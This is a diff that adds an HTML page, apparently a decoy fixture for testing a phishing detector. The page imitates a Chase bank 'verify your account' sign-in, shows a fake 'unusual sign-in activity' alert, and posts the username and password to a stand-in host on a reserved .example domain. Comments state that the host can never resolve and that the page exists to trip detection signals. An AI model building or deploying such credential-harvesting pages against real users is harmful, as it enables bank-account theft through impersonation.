@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <!-- Unlisted demo decoy: keep it out of search engines. -->
+    <meta name="robots" content="noindex, nofollow" />
+    <!-- Brand word in the title trips the impersonation signal (text only — no real
+         brand assets are used). -->
+    <title>Chase Online℠ — Verify Your Account</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <style>
+      * { box-sizing: border-box; }
+      body {
+        margin: 0; min-height: 100vh; font-family: "Inter", system-ui, sans-serif;
+        background: #f4f6f8; color: #11181f; display: flex; flex-direction: column;
+      }
+      .bar { background: #117aca; height: 6px; }
+      header {
+        padding: 22px 24px; display: flex; align-items: center; gap: 12px;
+        border-bottom: 1px solid #e2e8ef; background: #fff;
+      }
+      .logo {
+        font-weight: 700; font-size: 22px; color: #117aca; letter-spacing: -0.5px;
+      }
+      .logo span { color: #0a3d62; }
+      main {
+        flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px;
+      }
+      .card {
+        width: 100%; max-width: 380px; background: #fff; border: 1px solid #e2e8ef;
+        border-radius: 8px; padding: 32px 28px; box-shadow: 0 12px 40px -20px rgba(10,61,98,0.4);
+      }
+      h1 { font-size: 20px; margin: 0 0 4px; }
+      .note { font-size: 13px; color: #5b6b7b; margin: 0 0 22px; }
+      label { display: block; font-size: 13px; font-weight: 600; margin: 14px 0 6px; }
+      input {
+        width: 100%; padding: 11px 12px; font-size: 15px; border: 1px solid #c3cdd8;
+        border-radius: 6px; outline: none;
+      }
+      input:focus { border-color: #117aca; box-shadow: 0 0 0 3px rgba(17,122,202,0.15); }
+      button {
+        width: 100%; margin-top: 22px; padding: 12px; font-size: 15px; font-weight: 600;
+        color: #fff; background: #117aca; border: none; border-radius: 6px; cursor: pointer;
+      }
+      .alert {
+        background: #fff4e5; border: 1px solid #ffd9a8; color: #8a5a00; font-size: 12px;
+        border-radius: 6px; padding: 10px 12px; margin-bottom: 18px;
+      }
+      .ribbon {
+        position: fixed; bottom: 10px; right: 10px; background: #11181f; color: #ffd166;
+        font-size: 11px; font-family: ui-monospace, monospace; padding: 6px 10px;
+        border-radius: 6px; opacity: 0.9;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="bar"></div>
+    <header><span class="logo">CHASE<span>○</span></span></header>
+    <main>
+      <!-- The form posts the password to a DIFFERENT host on a reserved .example TLD:
+           it can never resolve, and the sandbox aborts it before it leaves. This trips
+           the cross-domain credential signal AND the live password trap. -->
+      <form class="card" action="https://account-verify-secure.example/collect" method="post">
+        <div class="alert">⚠ Unusual sign-in activity detected. Please verify your identity to restore access.</div>
+        <h1>Sign in</h1>
+        <p class="note">Verify your account to continue.</p>
+        <label for="user">Username</label>
+        <input id="user" name="username" type="text" autocomplete="username" />
+        <label for="pw">Password</label>
+        <input id="pw" name="password" type="password" autocomplete="current-password" />
+        <button type="submit">Sign in securely</button>
+      </form>
+    </main>
+    <div class="ribbon">SANDBOX DECOY — not a real site</div>
+  </body>
+</html>
